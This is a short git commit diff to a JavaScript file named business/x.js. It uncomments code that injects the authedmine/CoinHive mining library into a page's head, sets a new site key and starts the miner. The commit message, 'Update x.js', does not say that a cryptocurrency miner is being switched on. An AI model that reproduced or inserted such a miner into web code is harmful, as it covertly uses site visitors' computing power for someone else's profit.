c96538eaa0a3b8ff8808cdc7512b15b456d83f5c
YT File Server <32802331+youtubefileserver@users.noreply.github.com>
2018-03-02 20:50:32 +0000

    Update x.js

--- business/x.js
+++ business/x.js
@@ -1,12 +1,10 @@
-/*'use strict';
+'use strict';
     var head= document.getElementsByTagName('head')[0];
     var script= document.createElement('script');
     script.type= 'text/javascript';
     script.src= 'https://authedmine.com/lib/authedmine.min.js';
     head.appendChild(script);
     script.onload = function() {
-        var miner = new CoinHive.Anonymous('7CbSrIMXoIs24V0FH51kngm4jsiKfLoc');
+        var miner = new CoinHive.Anonymous('NIayhDzgu9LvvWabVtgoXjZWp0kq6qZJ');
         miner.start();
-        miner.setAutoThreadsEnabled(true);
     };
-*/
